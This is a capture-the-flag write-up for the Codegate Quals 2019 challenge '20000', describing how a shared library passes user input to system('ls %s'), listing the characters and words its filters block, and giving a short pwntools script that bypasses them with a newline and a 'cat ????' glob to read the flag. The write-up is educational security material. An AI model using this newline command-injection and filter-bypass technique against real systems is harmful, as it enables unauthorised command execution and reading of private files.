---
title: "20000 - Codegate Quals 2019"
date: "2019-01-28"
description: "Write-up for the 20000 challenge from Codegate Quals 2019."
tags: ["codegate", "ctf", "mhackeroni", "command-injection"]
showAuthor: false
---

{{< lead >}}
Authors: pietroferretti
{{< /lead >}}

>Is this the vulnerable library?

We have one executable, `20000`, and 20000 shared libs in the `20000_so` folder.

The main executable will let you choose which of the 20000 libs to actually load, then run the `test` function.

At a first look, most of the libs just immediately end execution with a call to `exit`. With a combination of testing all libs automatically and dumb luck, we noticed that the `lib_2035.so` lib calls `system("ls %s")` with our input, instead of just exiting.

`lib_2035.so` though loads and runs `filter1` from `lib_11896.so` and `filter2` from `lib_5163.so`, which prevent us from using the following characters and strings:

```
;
*
|
&
$
`
>
<
r
v
m
p
d
"bin"
"sh"
"bash"
f
l
g
```

Even with the filter, injecting arbitrary shell commands is easy, we just need to add an end-of-line character (`\n`). To read the flag file we can just use globbing and bypass the `f l g` filter.

```python
#!/usr/bin/env python2
from pwn import *
with remote('110.10.147.106', 15959) as p:
    p.recvuntil('INPUT : ')
    p.sendline('2035')
    p.recvuntil('file')
    p.sendline('"\ncat ????')
    p.interactive()
```

`flag{Are_y0u_A_h@cker_in_real-word?}`

